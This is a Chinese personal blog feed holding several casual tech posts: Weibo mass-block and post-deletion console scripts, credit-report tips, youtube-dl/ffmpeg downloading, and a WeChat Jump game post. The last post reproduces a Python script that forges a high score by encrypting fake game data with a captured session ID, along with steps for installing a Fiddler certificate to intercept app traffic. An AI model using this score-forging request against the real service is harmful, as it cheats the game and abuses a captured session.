左右，我也在这个水平间，除了月薪，外加 3 个月的绩效。 最近 朋友圈的左右脑年龄测试 非常火爆，好多人分享，有人研究了测试代码，发现所有的结果图片都是现成的，无论你做出什么选择，最后得到的答案图片都是随机的，代码是使用随机函数 rand 生成的，是不是很尴尬。 再说个朋友圈分享网易云音乐，如果登录 APP 后分享到朋友圈后点击进去复制链接会显示你的 网易云 id ，比如我朋友圈分享的这首歌《李香兰》 ，链接是 http://music.163.com/#/song/188703/?userid=293753445 最后的 userid 就是我的，http://music.163.com/#/user/home?id=293753445 替换最后的 id 就可以进入我的网易云音乐了，所以分享到朋友圈的网易云音乐会暴露你的网易账号，当然如果你不在意的话无所谓了，常听网易的朋友关注下我吧。 快双十一了，虽然每年本人都没什么要买的，话说手机上都没装过 淘宝 天猫 京东的 APP 什么的。但还是给大家分享个 京东领优惠券的油猴脚本，地址 https://greasyfork.org/zh-CN/scripts/34573-%E4%BA%AC%E4%B8%9C%E9%A2%86%E4%BC%98%E6%83%A0%E5%88%B8 如果嫌装扩展麻烦直接打开控制台执行里面的代码即可。 最后说个题外话： 免费Wi-Fi最好还是不要乱连，日前，知乎网友“tgyfjyj”对“如何分辨正规私立医院与莆田系医院”的一条回答获得了高票点赞： “进医院门搜索有没有一个Wi-Fi名称叫做‘free wifi’，连接以后通过手机短信免费上网，每隔一小时重新连接，有的话莆田系就八九不离十了。这是莆田系医院和百度合作的一套免费的Wi-Fi系统，主要用来收集客户客户资料等隐私信息的。全称‘百度黄金眼’系统。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微博拉黑脚本]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%BE%AE%E5%8D%9A%E6%8B%89%E9%BB%91%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[最近微博上线了个 微博监督员 服务，申请成微博监督员可以对微博进行举报，然后删除对方微博，为了防止被恶意举报，先把他们都拉黑吧。 拉黑列表 拉黑列表来自 http://weibo.com/p/1006066264005608/follow 这个页面的粉丝列表，先登录微博 在 console 执行以下代码即可。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143// from https://github.com/LyZane/weibo-supervisor-jsCrawlerfunction crawl()&#123; if(1 != document.querySelector(".page.S_bg1").innerText)&#123; console.error("请先手动跳转到粉丝列表的第一页后再次执行此脚本！"); return; &#125; var result = ""; var page = 1; var count = 0; var timer = setInterval(function()&#123; if(page != document.querySelector(".page.S_bg1").innerText)&#123; return; &#125; console.log("正在采集第 "+page+" 页..."); page++; var list = document.querySelectorAll(".icon_supervisor"); for(var i = 0; i &lt; list.length;i++)&#123; var item = list[i].parentNode.childNodes[1]; var usercard = item.attributes["usercard"].value; var uid = usercard.match(/id=\d+/)[0].match(/\d+/)[0]; result += uid + "\n"; count++; &#125; console.log("第 "+page+" 页采集完毕。"); if(page &lt; 6)&#123; // 翻页document.querySelector(".page.next").click(); &#125;else&#123; clearInterval(timer); console.info("采集完毕，共获取到 uid "+count +" 个：\n"+result); &#125; &#125;,1000);&#125;crawl();正在采集第 1 页...VM109:25 第 2 页采集完毕。VM109:14 正在采集第 2 页...VM109:25 第 3 页采集完毕。VM109:14 正在采集第 3 页...VM109:25 第 4 页采集完毕。VM109:14 正在采集第 4 页...VM109:25 第 5 页采集完毕。VM109:14 正在采集第 5 页...VM109:25 第 6 页采集完毕。VM109:30 采集完毕，共获取到 uid 99 个：拉黑脚本 // 感谢@overtrue https://github.com/overtrue/weibo-dogs-killer/blob/master/weibo-dogs-killer.js// 1. 使用 chrome 打开 https://weibo.com （确保你登录了微博）// 2. 打开调试窗口，在 console 中贴下面的代码后回车// 数据来自：https://github.com/yu961549745/WeiboBlackList1234567891011121314151617181920212223242526272829303132333435// 这个数组来自刚才获取的拉黑列表var dogs = [1041574032, 1113091931, 1234596492, 1265924373, 1280076535, 1282270102, 1282371413, 1283164021, 1297708027, 1305476450, 1344227894, 1348513711, 1374321134, 1377355290, 1391753093, 1403386141, 1405603123, 1409910532, 1410124131, 1429791521, 1484598381, 1495485357, 1505700263, 1525088397, 1570016173, 1579272310, 1588830357, 1613374674, 1632909860, 1642272495, 1649399345, 1651941013, 1653282974, 1657591691, 1658278557, 1666599012, 1670201221, 1674071682, 1680200411, 1682814920, 1690768907, 1693311335, 1694432737, 1696020927, 1702267517, 1703425261, 1709070650, 1713064495, 1719198895, 1723514521, 1723829324, 1725382803, 1732644913, 1736263965, 1736279014, 1737647831, 1739901115, 1743339141, 1745662665, 1748068057, 1749775825, 1749915415, 1751984912, 1755296263, 1759547087, 1762706205, 1765697405, 1766122373, 1774274405, 1775137910, 1775613335, 1777066395, 1781422637, 1782621495, 1787098822, 1789012593, 1790670015, 1790761961, 1794010902, 1800337273, 1823809197, 1824515351, 1824581023, 1839857351, 1840691947, 1851422170, 1851473734, 1852654103, 1859851754, 1884323354, 1885151102, 1887921907, 1889031894, 1889134740, 1889196427, 1891031660, 1892841767, 1893935004, 1900227754, 1903526513, 1906882191, 1909976992, 1912093364, 1913954770, 1918951193, 1920072325, 1922854483, 1926049617, 1926551181, 1935760780, 1937256124, 1943922885, 1945405223, 1954784600, 1954898722, 1978558182, 1985427375, 1997378897, 1997430313, 1998946093, 2018658895, 2033027873, 2042399737, 2045592021, 2066669447, 2095876615, 2102856290, 2106405744, 2112270821, 2119241041, 2122838230, 2143736030, 2162805902, 2170039871, 2195788654, 2202943573, 2205748423, 2219194830, 2238168285, 2240459775, 2253196910, 2265908004, 2274697173, 2278235085, 2284453344, 2299029823, 2301685773, 2308673977, 2313693972, 2314537334, 2330760312, 2334239593, 2335060081, 2345546897, 2346920665, 2348122654, 2355873243, 2357033797, 2360180761, 2369379394, 2369809515, 2372605411, 2379528185, 2397004535, 2400240411, 2401393393, 2401943477, 2405534261, 2407242912, 2418980745, 2455841223, 2468501370, 2477460747, 2504697545, 2518478637, 2520087880, 2528679641, 2531539783, 2546098600, 2561438355, 2571150711, 2610418693, 2611833450, 2612327705, 2614001562, 2614021785, 2622596227, 2626927361, 2633113967, 2639227461, 2640428811, 2645791712, 2647495542, 2650419291, 2661497287, 2667538945, 2669651422, 2681947182, 2682353630, 2694782097, 2697385482, 2708646527, 2709630325, 2714032523, 2720249823, 2722174021, 2728966594, 2731660797, 2734746975, 2766875143, 2803232204, 2806325147, 2822792580, 2826064925, 2829636631, 2847093540, 2849310171, 2875970310, 2877375185, 2884830430, 2885255711, 2898929101, 2922879225, 2928485055, 2930803125, 2932864527, 2934233095, 2945247480, 2950667711, 2963677843, 2970479921, 2992328377, 3029972167, 3030609907, 3040936547, 3049734521, 3050240134, 3051758861, 3065984831, 3078648857, 3087942931, 3116637797, 3123751063, 3141318761, 3157925462, 3159428572, 3168778251, 3170766712, 3173184517, 3174983660, 3182406654, 3184382850, 3189759282, 3190150355, 3209288190, 3209603200, 3212011227, 3226484780, 3230430014, 3235318832, 3240801333, 3261813374, 3271453730, 3280723341, 3287527637, 3305446403, 3318338712, 3358412904, 3397040152, 3440572154, 3477430640, 3481223447, 3496397221, 3545020587, 3590871057, 3592365365, 3607995250, 3621477511, 3626867120, 3653593281, 3685778045, 3688212085, 3703933374, 3715209581, 3732639263, 3738206370, 3786523043, 3786906784, 3831030697, 3840668734, 3848022748, 3932807856, 3948881580, 3951103736, 3973075219, 3974845528, 3975089454, 3979935493, 5012841321, 5014141958, 5020561830, 5031178946, 5038577367, 5059660551, 5063137160, 5064046310, 5078081210, 5088125436, 5088735141, 5091407789, 5092428322, 5100461906, 5106709983, 5108266451, 5116356922, 5117947348, 5131325967, 5142938036, 5146736086, 5150952118, 5158202693, 5158649359, 5174465539, 5207740184, 5209943797, 5219639005, 5226057797, 5235386046, 5241254653, 5243453050, 5248677108, 5253184819, 5284893156, 5289026864, 5293944806, 5303365027, 5330205046, 5338487311, 5343922833, 5344857001, 5364715873, 5379446771, 5380177988, 5381670096, 5398364817, 5426142115, 5433169859, 5450391911, 5454695683, 5460203843, 5464167149, 5471246591, 5474940961, 5480191060, 5488212817, 5515844015, 5527313256, 5532217137, 5532760509, 5571318748, 5573535479, 5577097996, 5580658563, 5580805844, 5589635076, 5603635635, 5608396703, 5612086708, 5613090845, 5623141879, 5623348537, 5623426877, 5623807609, 5634119774, 5638719581, 5640104831, 5651704821, 5651760514, 5657339966, 5666501360, 5669707661, 5671059533, 5674309904, 5675315465, 5675487085, 5682654049, 5686037085, 5697134119, 5700197684, 5736617825, 5752569967, 5760170376, 5768433920, 5785115772, 5791757379, 5801787915, 5816398532, 5836217079, 5865752737, 5868076583, 5895880265, 5897838856, 5898198360, 5926708754, 5935347929, 5942111104, 5973491890, 5976260575, 5984813988, 6031549751]var http = new XMLHttpRequest()var i = 0var timer = nullfunction kill() &#123; if (i &gt;= dogs.length) &#123; return clearInterval(timer) &#125; var dogId = dogs[i] var url = 'https://weibo.com/aj/filter/block?ajwvr=6'// 调用微博拉黑接口 http.open('POST', url, true) http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded') http.send('uid='+dogId+'&amp;filter_type=1&amp;status=1&amp;interact=1&amp;follow=1') http.onreadystatechange = function() &#123; if (http.readyState != 4 || http.status != 200) &#123; return; &#125; var data = &#123; msg: '解析失败' &#125; try &#123; data = JSON.parse(http.responseText) &#125; catch (err) &#123; &#125; if (data.code == 100000) &#123; console.log(i + '[' + dogId + '] =&gt; 成功:' + data.msg + ' - ' + http.status + ' - ' + http.responseText) &#125; else &#123; console.error(i + '[' + dogId + '] =&gt; 失败:' + data.msg + ' - ' + http.status + ' - ' + http.responseText) &#125; &#125; i++&#125;timer = setInterval(kill, 1000) 红包微博删除 每次过年的时候会抢很多红包，但都会默认发一条微博，所以想删除那些红包微博，于是有了以下脚本。 // from https://github.com/pythias/weibo-hongbao-cleaner/blob/master/weibo-hongbao-cleaner.js// 1. 使用 chrome 打开 weibo.com （确保你登录了微博）// 2. 打开调试窗口，在 console 中贴下面的代码后回车// 3. 如需删除其他微博，请输入一下内容后回车：start(‘替换成你要删除的内容’);12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394let mids = [];let midIndex = 0;let timer = null;let page = 0;let keyWord = '';let running = false;let http = new XMLHttpRequest();function cleanByPage() &#123; let userId = $CONFIG['uid']; let url = 'https://weibo.com/p/aj/v6/mblog/mbloglist?ajwvr=6&amp;domain=100505&amp;rightmod=1&amp;wvr=6&amp;mod=personnumber&amp;is_all=1&amp;is_search=1&amp;pagebar=1&amp;feed_type=0&amp;domain_op=100505&amp;key_word=' + encodeURI(keyWord) + '&amp;page=' + page + '&amp;pre_page=' + page + '&amp;id=100505' + userId + '&amp;__rnd=1507705795334'; http.open('GET', url, true); http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); http.send(); http.onreadystatechange = function() &#123; if (http.readyState != 4 || http.status != 200) &#123; return; &#125; let json = &#123;&#125; try &#123; json = JSON.parse(http.responseText); &#125; catch (error) &#123; stop('请求失败'); return; &#125; if (json.code != 100000) &#123; stop('请求失败：' + json.msg); return; &#125; let matches = json.data.match(/mid=([0-9]+)/g); if (matches == null) &#123; stop('已经删光所有含有"' + keyWord + '"的微博'); return; &#125; let values = &#123;&#125;; matches.forEach(function(match) &#123; values[match.substr(4)] = 0; &#125;, this); mids = Object.keys(values); timer = setInterval('cleanNext();', 1000); console.log('找到 ' + mids.length + ' 条含有"' + keyWord + '"的微博'); &#125;&#125;function cleanNext() &#123; if (midIndex &gt;= mids.length) &#123; mids = []; midIndex = 0; page++; clearInterval(timer); setTimeout('cleanByPage();', 1000); return; &#125; cleanByMid(mids[midIndex]); midIndex++;&#125;function cleanByMid(mid) &#123; http.open('POST', 'https://weibo.com/aj/mblog/del?ajwvr=6', true); http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); http.send('mid=' + mid); http.onreadystatechange = function() &#123; if (http.readyState != 4 || http.status != 200) &#123; return; &#125; let json = &#123;&#125; try &#123; json = JSON.parse(http.responseText); &#125; catch (error) &#123; return; &#125; if (json.code == 100000) &#123; console.log('删除成功 - ' + mid); &#125; else &#123; console.log('删除失败 - ' + mid); &#125; &#125;&#125;function stop(message) &#123; clearInterval(timer); running = false; console.log(message);&#125;function start(kw) &#123; if (running) &#123; console.log('正在删除含有"' + keyWord + '"的微博，请稍后再试'); return; &#125; console.log('开始删除含有"' + kw + '"的微博'); running = true; mids = []; page = 0; midIndex = 0; keyWord = kw; cleanByPage();&#125;start('红包');]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查询自己的个人征信]]></title>
    <url>%2F2019%2F08%2F28%2F%E6%9F%A5%E8%AF%A2%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%BE%81%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[之前花 2000 买了个 py 课程，今天一直在看教程学，学习量还是挺大的，尽管对 py 熟悉有段时间了，特意建了个 repo 来记录学习笔记。 昨天在支付宝的芝麻信用（目前 724 分）里突然看到了人行征信报告（进入信用管理可以看到），于是就想查询下自己的个人征信，但 APP 里一直注册不了 ，于是就去人行官网查。 先用自己身份证号注册，然后具体查询步骤搜下就可以，比如百度经验 https://jingyan.baidu.com/article/46650658221445f548e5f85d.html 或者公众号 越女事务所 越 越女事务所 又查了下自己的信用 我也是这样查的，但是发现很麻烦 一开始要安全等级变更 还要装控件输入银行卡密码，chrome 支持又不好，罢了 然后去支付宝登录查提示这个，看来我没有记录。 还有一种查询办法，去银行网点查询，但不是每个网点都可以，每个城市具体位置查询 这个网站 http://www.pbccrc.org.cn/zxzx/lxfs/lxfs.shtml 可以看到。在网点查询前 2 次免费，第 3 次开始要收费。 话说征信还是蛮重要的，如果你去贷款什么的如果有还款逾期记录，可能都贷不下来。前段时间趣店上市被骂了，这种网贷似乎是高利贷的变种，只是通过互联网来销售，前几天看了篇文章 网贷20万，我真没有花这么多钱 各种网贷 一旦上瘾如同鸦片一般，难以脱身，这又让我想起那部经典喜剧《武林外传》的一个片段：白展堂打麻将赢了李大嘴不少银子，于是李叫上他娘来跟白赌，开始白没放眼里，可是接连输了好几回后才知道自己遇上高手了，输完钱后还想赢回来，最后把自己的手给押上，最后刀落下的那一刻，他才真正明白什么叫小赌怡情，大赌灰灰湮灭，谁也不知道哪天会遇上一位世外高人断指轩辕。 有兴趣可以看看这个 5 分钟的剪辑视频。 不过有个说法，征信不要多次查询，银行可能会认为你信用有问题，最近是否总借钱。 查完征信后想着查查自己的学历和学位，那两个证书还放在保险箱里，这么多年跟着我还没丢，万一你的丢了，如果记得证书编号可以在学信网查到记录的，不用担心没法证明自己的学历。以下是我的学历信息，重要部位打了马赛克。 ps：最近支付宝搞了个扫码领红包的活动，简单的说就是发红包，邀请好友用支付宝线下消费，然后两个人都能领，这几天朋友圈好多人在转自己的红包二维码，话说之前都用微信支付的，用支付宝支付发现优惠力度还是蛮大的（除了打开有点慢外），而且还能给蚂蚁森林加能量。所以你也赶紧来扫下我的二维码吧，哈哈。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[双十一最该打折的是什么]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%8F%8C%E5%8D%81%E4%B8%80%E6%9C%80%E8%AF%A5%E6%89%93%E6%8A%98%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[自己的手 据百度百科介绍： 双十一购物狂欢节是指每年11月11日的网络促销日源于淘宝商城（天猫）2009年11月11日举办的促销活动，当时参与的商家数量和促销力度有限，但营业额远超预想的效果，于是11月11日成为天猫举办大规模促销活动的固定日期。双十一已成为中国电子商务行业的年度盛事，并且逐渐影响到国际电子商务行业。 2014年11月11日，阿里巴巴双十一全天交易额571亿元。2015年11月11日，天猫双十一全天交易额912.17亿元。 2016年11日24时，天猫双十一全天交易额超1207亿。 一个好好的光棍节活生生被阿里弄成购物狂欢节，此刻优酷正在直播双十一晚会，我也是无聊打开看看。 微博也成热搜，可以理解，毕竟优酷和微博都是阿里投资的，还好微信里屏蔽了淘宝链接，否则群是没法看了。 大家都在准备抢购，我就厉害了，看看去年的双十一账单 每到换季，男人和女人都会抱怨：没衣服穿了，但是两者所表达的意思是完全不同的。 男人表达的意思是：衣柜里真的找不出一件能套上出门的衣服了。 女人表达的意思是：衣柜里没有自己想穿出门的衣服穿了，至于想不穿出门的原因，则多种多样：款式过时，颜色跟包不搭，风格跟发型不搭等等，所谓衣柜里永远缺一件衣服。 买买买，并没什么不好，尤其这种狂欢节，许多人是把最近一个月要买的东西都屯到双十一这天，花自己的钱，过自己的节嘛。 在物质匮乏的年代，想买点东西还真不容易，记得小时候家里的东西都是妈妈买的，家附近也没有小卖部，偶尔才去镇上买点东西回来，如今网络盛行的年代，有了万能的淘宝，没什么买不来的。 虽然对各种购物节无感，但确实有了网购以后方便多了，现在买东西几乎都不去实体店了。我平常购物还是用京东更多点，因为微信里更方便，京东可以直接用微信支付，一般也都是隔天到。淘宝也偶尔用，在网页上买，因为没装天猫和淘宝的 APP。 各个公众号和网站都在促销打折，都没什么兴趣，还是期待下 sf 的双十一特价课程https://segmentfault.com/lives/1111 ，多花钱充实下自己。 上周 sf 还送了我一个抱枕，还有一段温馨的文字，感谢 sf。 https://weibo.com/2717930601/FsMKu7GEZ ps：分享一个 win 上打开 2 个微信客户端的方法，进入 wechat 安装目录，打开命令行执行 start WeChat.exe&amp;WeChat.exe 即可]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[下载电影/视频神器]]></title>
    <url>%2F2019%2F08%2F28%2F%E4%B8%8B%E8%BD%BD%E7%94%B5%E5%BD%B1-%E8%A7%86%E9%A2%91%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[之前写过一篇 下载电影/视频神器 主要是介绍 you-get ,这里再介绍一个下载国外视频的工具，同样是基于 python 的 youtube-dl 先说说安装 先要下载 python 12pip install youtube-dl //直接安装 youtube-dlpip install -U youtube-dl //安装 youtube-dl 并更新 （如果安装过） 如果要下载 前提得翻出去,这个比较有难度，具体方法自己百度或谷歌吧，比如常用的 ss, 命令行下载加上代理 –proxy “https://127.0.0.1:1080&quot; 当然也可以在命令行执行 export http_proxy=http://127.0.0.1:1080 export https_proxy=https://127.0.0.1:1080 这样命令行也可以 翻出去了 ，然后就可以下载了。youtubetoo.co 虽然名字叫 youtube-dl ( youtube 是个国外的知名视频网站，可惜国内访问不了，至于为什么，你懂的) ,但它也支持部分国内视频网站 https://rg3.github.io/youtube-dl/supportedsites.html 这里是支持列表，不过我刚才试了下，网易音乐就下载不了。1234567891011121314151617181920212223242526272829$ youtube-dl 'http://music.163.com/song?id=167880'[netease:song] 167880: Downloading song info[netease:song] 167880: Checking song URL[netease:song] 167880: song URL is invalid, skipping[netease:song] 167880: Checking song URL[netease:song] 167880: song URL is invalid, skipping[netease:song] 167880: Checking song URL[netease:song] 167880: song URL is invalid, skipping[netease:song] 167880: Checking song URL ERROR: Unable to download webpage: [WinError 10053] 您的主机中的软件中止了一个已建立的连接。 (caused by ConnectionAbortedError(10053, '您的主机中的软件中止了一个已建立的连接。', None, 10053, None)); please report this issue on https://yt-dl.org/bug . Make sure you are using the latest version; see https://yt-dl.org/update on how to update. Be sure to call youtube-dl with the --verbose flag andinclude its complete output. 然后说到 ffmpeg 下载 m3u8 ，这里用 斗鱼为例 先到 https://ffmpeg.org/download.html 下载工具 ffmpeg,然后下载周杰伦的这首《枫》https://v.douyu.com/show/ra2JEMJgB2WNxml6， 通过控制台可以看到 m3u8 地址 http://videows1.douyucdn.cn/live/normal_399318620161117220817/playlist.m3u8?k=c7a113074e987e0bc6e9095a163b5aef&amp;t=5a198153&amp;u=0&amp;ct=web&amp;vid=15494&amp;d=2BF670C8284583FC69011E718786E8D3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ ffmpeg -i 'http://videows1.douyucdn.cn/live/normal_399318620161117220817/playlist.m3u8?k=c7a113074e987e0bc6e9095a163b5aef&amp;t=5a198153&amp;u=0&amp;ct=web&amp;vid=15494&amp;d=2BF670C8284583FC69011E718786E8D3' -c copy jay.tsffmpeg version N-88193-g5834cba05e Copyright (c) 2000-2017 the FFmpeg developers built with gcc 7.2.0 (GCC) configuration: --enable-gpl --enable-version3 --enable-sdl2 --enable-bzlib --enable-fontconfig --enable-gnutls --enable-iconv --enable-libass --enable-libbluray --enable-libfreetype --enable-libmp3lame --enable-libopenjpeg --enable-libopus --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libtheora --enable-libtwolame --enable-libvpx --enable-libwavpack --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libzimg --enable-lzma --enable-zlib --enable-gmp --enable-libvidstab --enable-libvorbis --enable-cuda --enable-cuvid --enable-d3d11va --enable-nvenc --enable-dxva2 --enable-avisynth --enable-libmfx libavutil 56\. 0.100 / 56\. 0.100 libavcodec 58\. 0.101 / 58\. 0.101 libavformat 58\. 0.101 / 58\. 0.101 libavdevice 58\. 0.100 / 58\. 0.100 libavfilter 7\. 0.100 / 7\. 0.100 libswscale 5\. 0.100 / 5\. 0.100 libswresample 3\. 0.100 / 3\. 0.100 libpostproc 55\. 0.100 / 55\. 0.100[hls,applehttp @ 0000000000517540] Opening 'http://videows1.douyucdn.cn/live/normal_399318620161117220817/5314b7d5007b46528e369b4865225950_0000000.ts?k=c7a113074e987e0bc6e9095a163b5aef&amp;t=5a198153&amp;u=0&amp;ct=web&amp;vid=15494&amp;d=2BF670C8284583FC69011E718786E8D3' for reading 下载到本地的 jay.ts 文件(23 MB)可以用 vlc 播放器来播放，然后转换为 mp4 格式 就可以用 QQ 播放器来播放了。 除了 ffmpeg 还有可以用 livestreamer或者streamlink 来下载，先用 pip 安装就可以了。 最后说个最简单的办法，通过浏览器来获取视频地址下载。 当然每个网站不一样，有些网站不适合，这里以 b 站为例，这里要下载的视频是《那些年，我们一起追的女孩》 ，地址 http://www.bilibili.com/video/av9632377/ 通过控制台可以看到实际的文件地址为 https://tx.acgvideo.com/b/43/15919534-1.mp4?txTime=1511626123&amp;platform=pc&amp;txSecret=a9aa8bbabda3130ec81af47a5eecb1e0&amp;oi=1898888581&amp;rate=143072&amp;hfb=b99ffc3c5c68f00a33123bb25f882d5b 然后用浏览器直接打开就可以下载了 ，话说沈佳宜真漂亮。 这里再推荐几个搜百度网盘资源网站 http://www.panyisou.com/search/ http://www.pansou.com/ http://www.xiaobaipan.com/ http://www.fastsoso.cn/ http://www.sobaidupan.com/ http://www.panc.cc/ http://www.52xsba.com/video/ http://www.flvurl.cn/ http://vip.shuidi.im http://www.yiqikanvip.com/ http://www.ttspore.top http://loving.bike/shi/ http://source.surge.sh/video.html http://www.dianyingvip.com]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信跳一跳小游戏有毒]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%BE%AE%E4%BF%A1%E8%B7%B3%E4%B8%80%E8%B7%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E6%9C%89%E6%AF%92%2F</url>
    <content type="text"><![CDATA[前几天圣诞节的时候朋友圈突然流行这句话：请给我一个圣诞帽@微信官方 然后好多人的微信头像加了圣诞帽，不过我没发朋友圈，我朋友圈很少发这些，大多发的是一些我喜欢看的文章，电影，公众号和音乐。 一开始的时候我还以为是真的，心想，微信牛逼啊，这也可以，微信应该是将发了这条朋友圈的人加入队列来处理圣诞帽，看到越来越多人发，但是有些人并没有头像加圣诞帽，才意识到这些头像都是自己 p 的，还有人在朋友卖p头像加圣诞帽，服了，老铁。 大多数人在意识自己被骗的时候不是停止被骗，而是继续假装相信，让更多人受骗，不能让自己一人受骗，虽然加个圣诞帽对别人并无影响，但如果是涉及钱财的就严重了，比如最近 p2p 钱宝崩盘倒闭，官方微博 https://weibo.com/1972917825/FByouw8xk 都发消息了，还有人说微博被盗，因为平时用安卓发微博，这次用的 iPhone，真是可笑又可悲。 话说上个月看到一个公众号推友金所的活动，新手 12% 而且限制 2万，不能算高，然后买了一万投资30天，前几天到期回到银行卡，利息 100，加上送的 50话费共150，比余额宝一个月 30 的确高多了，但是12%只能投资一次，正好这几天支付宝搞积分加息活动，平常 5%的理财产品可以到近10%，于是买了几万，定期 1个月。这些都是比较安全的，毕竟没有钱宝那么高的收益。 后来上微博才发现原来一直用的 node 自带显示圣诞的命令npm xmas ，然后@2gua 用PHP写了个Xmas祝福树 https://weibo.com/1609119537/FB2ehi4QE 有人用代码写一颗圣诞树 http://js1k.com/2010-xmas/demo/856 http://edagarli.b0.upaiyun.com/christmastree/ https://coolshell.cn/christmas/ 代码都开源了https://github.com/edagarli/christmastree 还有用Python给头像加上圣诞帽 https://juejin.im/entry/5a3f08bbf265da43104895c6 让你的终端在圣诞节下雪 https://github.com/sontek/snowmachine pip install snowmachine 安装好就可以了， 技术宅果然会过节。 最近支付宝的扫码活动每个群都有人在发，真是烦不胜烦，为了几毛钱每天发微信群和朋友圈，看到我都会内心 diss 下，至于吗！而且发的内容越来越段子，比如支付宝这条微博https://weibo.com/1891502860/FBDY1p0n9?type=comment ：为了让大家复制吱口令去支付宝上领红包，然后美滋滋地赚赏金，这些编段子的人真是煞费苦心了。 虽然我也领红包，但从不参与这些，可是不知道为什么每次扫码都是 0.33，后来上微博才发现原来好多人这样，这条微博 https://weibo.com/6202887421/FBJtVFkrH 是这样的： 来科普一下支付宝今年的红包战略为啥有那么多的人领到0.33乃至更少的红包！为啥那么少阿？挑明了说，因为你是支付宝活跃度极高的用户，扎心了，支付宝。 最后说说微信前天刚上线的小游戏，这游戏简直有毒，昨天晚上我玩到1点，坑的是每次要重新玩，所以如果掉下去了得重新来，所以特好打发时间。微信派小编和我一样 我一夜没睡 我近 1000 好友，有 200 多人在玩，我才排名 100 要准备继续玩了。 想玩的话更新到微信最新版 6.6.1 进入小程序搜索小游戏就可以看到了，这个版本你玩过的小程序在首页拉下来的时候都可以看到。 微信派还爆出了些技巧： 跳在盒子中间，会得 2 分；连续调在盒子中间，会在上次的基础上累加 2 分。 跳在一些特殊样式的盒子上停留一段时间，比如徐记士多、魔方、黑胶唱片机、井盖等，会获得 5 - 30 不等的额外加分。得分的时候还有配乐 还有博主刘健亮 爆料：”跳一跳”小游戏竟然隐藏上分彩蛋！ 望月的博客 微信跳一跳游戏如何获得高分 然后今天上微博上发现有人已经破解了 比如这篇 教你用python 玩微信跳一跳 https://github.com/wangshub/wechat_jump_game 需要用到 python adb 驱动 和Python Matplot绘图 然后有人刷到 10 万分！ 主要是抓包来模拟请求，具体可以看这篇文章 http://www.site-digger.com/html/articles/20160509/123.html Android安装Fiddler证书抓取App的HTTPS流量 http://blog.csdn.net/roland_sun/article/details/30078353 http://blog.devtang.com/2015/11/14/charles-introduction/ Charles 从入门到精通 假设Fiddler所在主机的IP是192.168.199.128。在Android上打开Web浏览器，访问http://192.168.199.128:8888 点击“FiddlerRoot certificate”连接，输入一个证书名称（任意），点确定即可（若未设置解锁密码，需要先设置）。 确认一下证书是否安装成功：设置 -&gt; 安全 -&gt; 受信任的凭证 -&gt; 用户。看到”DO_NOT_TRUST“即说明安装成功。 完整代码如下：from https://zhuanlan.zhihu.com/p/324733401234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import requestsimport jsonimport timefrom Crypto.Cipher import AESimport base64action_data = &#123; "score": 10086, "times": 666, "game_data": "&#123;&#125;"&#125; 抓包获取 short.weixin.qq.com 请求的 sid https://zhuanlan.zhihu.com/p/32473340 session_id = "5TrXoE7IXtM/Nr7vITnbU9bmR53VH0u8RkVnm6m/Fezg=="aes_key = session_id[0:16]aes_iv = aes_keycryptor = AES.new(aes_key, AES.MODE_CBC, aes_iv)str_action_data = json.dumps(action_data).encode("utf-8")print("json_str_action_data ", str_action_data)#Pkcs7length = 16 - (len(str_action_data) % 16)str_action_data += bytes([length])*lengthcipher_action_data = base64.b64encode(cryptor.encrypt(str_action_data)).decode("utf-8")print("action_data ", cipher_action_data)post_data = &#123; "base_req": &#123; "session_id": session_id, "fast": 1, &#125;, "action_data": cipher_action_data&#125;headers = &#123; "charset": "utf-8", "Accept-Encoding": "gzip", "referer": "https://servicewechat.com/wx7c8d593b2c3a7703/3/page-frame.html", "content-type": "application/json", "User-Agent": "MicroMessenger/6.6.1.1200(0x26060130) NetType/WIFI Language/zh_CN", "Content-Length": "0", "Host": "mp.weixin.qq.com", "Connection": "Keep-Alive"&#125;url = "https://mp.weixin.qq.com/wxagame/wxagame_settlement"response = requests.post(url, json=post_data, headers=headers)print(json.loads(response.text)) ps：最近看到一个网站好复古，如同操作 win7 系统的网站，很有特色 http://www.kingnare.com/auzn/ http://dinhquangtrung.net/windows7/ pps：年底了，很多公司要开年会，节目还没想到方案，不如看看这个相声 http://wt.ftqq.com/read/1002]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的 2017 年]]></title>
    <url>%2F2019%2F08%2F28%2F%E6%88%91%E7%9A%84-2017-%E5%B9%B4%2F</url>
